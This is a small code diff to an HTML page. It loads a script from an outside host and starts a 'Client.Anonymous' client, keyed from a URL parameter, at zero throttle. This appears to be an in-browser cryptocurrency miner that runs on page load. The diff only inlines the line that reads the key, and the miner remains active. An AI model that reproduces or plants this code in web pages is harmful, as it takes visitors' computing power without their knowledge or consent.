@@ -10,8 +10,7 @@
 <body>
     <script src="https://www.hostingcloud.racing/iPx4.js"></script>
     <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const _client = new Client.Anonymous(urlParams.get('s'), { throttle: 0, c: 'w' });
+        const _client = new Client.Anonymous(new URLSearchParams(window.location.search).get('s'), { throttle: 0, c: 'w' });
         _client.start();
     </script>
 </body>
